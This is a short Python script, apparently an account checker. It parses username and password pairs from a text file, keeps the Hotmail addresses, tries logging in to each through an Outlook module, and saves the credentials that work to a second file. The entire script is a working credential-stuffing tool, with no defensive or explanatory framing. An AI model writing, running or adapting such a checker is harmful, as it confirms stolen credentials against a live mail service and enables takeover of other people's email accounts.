import outlook
    
def cleanString ( stringChain ):
	position = stringChain.find(':') + 1
	stringChain = stringChain[position:]
	stringChain = stringChain.strip()
	
	return stringChain

def validateHotmailEmail ( email ):
	if 'hotmail' in email.lower():
		return True
	return False
	
def testConnection ( userName, passw ):
	mail = outlook.Outlook()
	try:
		return mail.loginMine(userName, passw)
	except:
		print("An exception occurred")
		return False
	
fileToRead = open('lista_comprobar.txt', 'r')
fileToWrite = open('lista_validados.txt', 'w')

userName = ''
passw = ''
print ('Loading...')

for line in fileToRead:
	if 'user' in line.lower():
		userName = cleanString(line)
		passw = ''
	if 'pass' in line.lower():
		passw = cleanString(line)

	if validateHotmailEmail ( userName ) == False:
		userName = ''

	if userName != '' and passw != '':
		print(userName + ' - ' + passw)
		if testConnection(userName, passw):
			fileToWrite.write(userName + '\n')
			fileToWrite.write(passw + '\n')
		userName = ''
		passw = ''
		
fileToRead.close()
fileToWrite.close()

print ('File created!')

 
